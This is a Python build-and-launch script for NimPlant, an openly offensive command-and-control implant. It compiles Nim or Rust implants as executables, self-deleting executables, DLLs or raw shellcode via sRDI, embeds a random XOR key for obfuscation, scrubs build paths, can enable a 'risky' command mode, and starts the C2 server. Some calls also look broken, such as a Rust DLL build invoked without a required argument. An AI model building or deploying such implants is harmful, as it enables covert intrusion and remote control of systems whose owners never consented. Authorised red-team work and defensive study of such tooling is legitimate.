#!/usr/bin/python3

# -----
#
#   NimPlant - A light-weight stage 1 implant and C2 based on Nim and Python
#   By Cas van Cooten (@chvancooten)
#   with special thanks to Kadir Yamamoto (@ted_tsuji) for the front-end
#
#   This is a wrapper script to configure and generate NimPlant and its C2 server
#
# -----

import os
import random
import shutil
import string
import time
import toml
from pathlib import Path
from srdi.ShellcodeRDI import *

def print_banner():
    print("""
                  *    *(#    #             
                  **  **(##  ##             
         ########       (       ********    
        ####(###########************,****   
           # ########       ******** *      
           .###                   ***       
           .########         ********       
           ####    ###     ***    ****      
         ######### ###     *** *********    
       #######  ####  ## **  ****  *******  
       #####    ##      *      **    *****  
       ######  ####   ##***   **** .******  
       ###############     ***************  
            ##########     **********       
               #########**********          
                 #######********           
     _   _ _           ____  _             _   
    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_ 
    |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
    | |\  | | | | | | |  __/| | (_| | | | | |_ 
    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|                                  
                                                                                                  
        A light-weight stage 1 implant and C2 based on Nim and Python
        By Cas van Cooten (@chvancooten)
    """)


def print_usage():
    print("""
    Usage:
        python3 NimPlant.py command [required args] <optional args>

    Acceptable commands:
        compile [exe / exe-selfdelete / dll / raw / all] <nim / rust / rust-debug> <rotatekey>
        server <server name>
    """)


def getXorKey(force_new = False):
    if (os.path.isfile(".xorkey") and force_new == False):
        file = open(".xorkey", "r")
        xor_key = int(file.read())
    else:
        print("Generating unique XOR key for pre-crypto operations...")
        print("NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!")
        xor_key = random.randint(0, 2147483647)
        file = open(".xorkey", "w")
        file.write(str(xor_key))

    return xor_key


def compile_implant(implant_type, binary_type, xor_key):
    if implant_type == "rust":
        message = "Rusty NimPlant"
        compile_function = compile_rust
    elif implant_type == "rust-debug":
        message = "Rusty NimPlant with Debug"
        compile_function = compile_rust_debug
    else:
        message = "NimPlant"
        compile_function = compile_nim

    if binary_type == "exe":
        print("Compiling .exe → " + message)
        compile_function("exe", xor_key)
    elif binary_type == "exe-selfdelete":
        print("Compiling self-deleting .exe → " + message)
        compile_function("exe-selfdelete", xor_key)
    elif binary_type == "dll":
        print("Compiling .dll → " + message)
        compile_function("dll", xor_key)
    elif binary_type == "raw" or binary_type == "bin":
        print("Compiling .bin → " + message)
        compile_function("raw", xor_key)
    else:
        print("Compiling .exe → " + message)
        compile_function("exe", xor_key)
        print("Compiling self-deleting .exe → " + message)
        compile_function("exe-selfdelete", xor_key)
        print("Compiling .dll → " + message)
        compile_function("dll", xor_key)
        print("Compiling .bin → " + message)
        compile_function("raw", xor_key)


def compile_nim(binary_type, xor_key):
    # Parse config for certain compile-time tasks
    configPath = os.path.abspath(os.path.join(os.path.dirname(sys.argv[0]), 'config.toml'))
    config = toml.load(configPath)

    # Construct compilation command
    if binary_type == "exe" or binary_type == "exe-selfdelete" or binary_type == "dll":
        compile_command = f"nim c --hints:off --warnings:off -d:xor_key={xor_key} -d:release -d:strip --opt:size --app:gui"

        if binary_type == "exe":
            compile_command = compile_command + " -o:client/bin/NimPlant.exe"

        if binary_type == "exe-selfdelete":
            compile_command = compile_command + " -o:client/bin/NimPlant-selfdelete.exe -d:selfdelete"

        if os.name != "nt":
            compile_command = compile_command + " -d=mingw"

        if binary_type == "dll":
            compile_command = compile_command + " -o:client/bin/NimPlant.dll --app=lib --nomain -d:exportDll"

            if os.name != "nt":
                print("WARNING: It is recommended to compile DLLs and shellcode from native Windows. Cross-compilation is unstable and may not work. Make sure to test your payload!")

        # Allow risky commands only if defined in config.toml
        risky_mode_allowed = config['nimplant']['riskyMode']
        if risky_mode_allowed:
            compile_command = compile_command + " -d:risky"

        compile_command = compile_command + " client/NimPlant.nim"
        os.system(compile_command)

    elif binary_type == "raw":
        if not os.path.isfile("client/bin/NimPlant.dll"):
            compile_nim("dll", xor_key)
        else:
            # Compile a new DLL NimPlant if no recent version exists
            file_mod_time = os.stat("client/bin/NimPlant.dll").st_mtime
            last_time = (time.time() - file_mod_time) / 60

            if not last_time < 5:
                compile_nim("dll", xor_key)

        # Convert DLL to PIC using sRDI
        dll = open("client/bin/NimPlant.dll", "rb").read()
        shellcode = ConvertToShellcode(dll, HashFunctionName('Update'), flags=0x5)
        with open("client/bin/NimPlant.bin", "wb") as f:
            f.write(shellcode)


def compile_rust_debug(binary_type, _):
    compile_rust(binary_type, _, True)


def compile_rust(binary_type, _, debug=False):
    # Prepare paths
    cwd = os.getcwd()
    os.chdir(os.path.join(cwd, "client-rs"))
    bin_dir = os.path.join(cwd, "client-rs", "bin")
    target_dir = os.path.join(cwd, "client-rs", "target")

    # Create the output directory
    if not os.path.exists(bin_dir):
        os.mkdir(bin_dir)

    # Prepare filename for exe
    executable_name = "rusty_nimplant"
    library_name = "rusty_nimplant"

    # Prepare commands
    debug_flag = ""

    if debug:
        debug_flag = " --features debug"
        executable_name = executable_name + "_debug"
        library_name = library_name + "_debug"

    disappear_flag = ""

    # The entry points for exe and dll are different for rust.
    if binary_type == "exe-selfdelete":
        disappear_flag = ",disappear" if debug_flag != "" else " --features disappear"
        executable_name = executable_name + "_self-delete"

    compile_commands = []
    binaries = {}

    random_identifier = ''.join(random.choice(string.ascii_letters) for _ in range(24))
    rust_flags = f"--remap-path-prefix {Path.home()}={random_identifier}"
    base_command = f"cargo build --release {debug_flag}{disappear_flag}"

    if sys.platform != "win32":
        # Cross-compile to windows on non-windows platforms
        binaries[executable_name] = os.path.join(target_dir, "release", "rusty_nimplant")
        binaries[f"{executable_name}.exe"] = os.path.join(target_dir, "x86_64-pc-windows-gnu", "release", "rusty_nimplant.exe")
        binaries[f"{library_name}.dll"] = os.path.join(target_dir, "x86_64-pc-windows-gnu", "release", "rusty_nimplant.dll")

        compile_commands.append(f"RUSTFLAGS=\"{rust_flags}\" {base_command} --bins")
        compile_commands.append(f"RUSTFLAGS=\"{rust_flags}\" {base_command} --target x86_64-pc-windows-gnu")
    else:
        # If on windows, just compile the native binaries
        binaries[f"{executable_name}.exe"] = os.path.join(target_dir, "release", "rusty_nimplant.exe")
        binaries[f"{library_name}.dll"] = os.path.join(target_dir, "release", "rusty_nimplant.dll")

        compile_commands.append(f"{base_command} -- {rust_flags}")

    # Run the compilation commands and copy output
    if binary_type in ["exe", "dll",  "exe-selfdelete"]:
        for c in compile_commands:
            os.system(c)
        for output_name in binaries:
            shutil.copy2(binaries[output_name], os.path.join(bin_dir, output_name))

    elif binary_type == "raw":
        dll_path = os.path.join(bin_dir, "rusty_nimplant.dll")
        bin_path = os.path.join(bin_dir, "rusty_nimplant.bin")
        if not os.path.isfile(dll_path):
            compile_rust("dll")

        dll = open(dll_path, "rb").read()
        shellcode = ConvertToShellcode(dll, HashFunctionName('Update'), flags=0x5)
        with open(bin_path, "wb") as f:
            f.write(shellcode)

    os.chdir(cwd)


if __name__ == "__main__":
    print_banner()

    if not os.path.isfile("config.toml"):
        print("ERROR: No configuration file found. Please create 'config.toml' based on the example configuration before use.")
        exit(1)

    if len(sys.argv) > 1:
        if sys.argv[1] == "compile":

            if len(sys.argv) > 3 and sys.argv[3] in ["nim", "rust", "rust-debug"]:
                implant = sys.argv[3]
            else:
                implant = "nim"

            if len(sys.argv) > 2 and sys.argv[2] in ["exe", "exe-selfdelete", "dll", "raw", "bin", "all"]:
                binary = sys.argv[2]
            else:
                binary = "all"

            if "rotatekey" in sys.argv:
                xor_key = getXorKey(True)
            else:
                xor_key = getXorKey()

            compile_implant(implant, binary, xor_key)

            if implant == "nim":
                print("Done compiling! You can find compiled binaries in 'client/bin/'.")
            elif implant == "rust" or implant == "rust-debug":
                print("Done compiling! You can find compiled binaries in 'client-rs/bin/'.")

        elif sys.argv[1] == "server":
            xor_key = getXorKey()
            from server.server import main

            try:
                name = sys.argv[2]
                main(xor_key, name)
            except:
                main(xor_key, "")

        else:
            print_usage()
            print("ERROR: Unrecognized command.")
            exit(1)
    else:
        print_usage()
        exit(1)
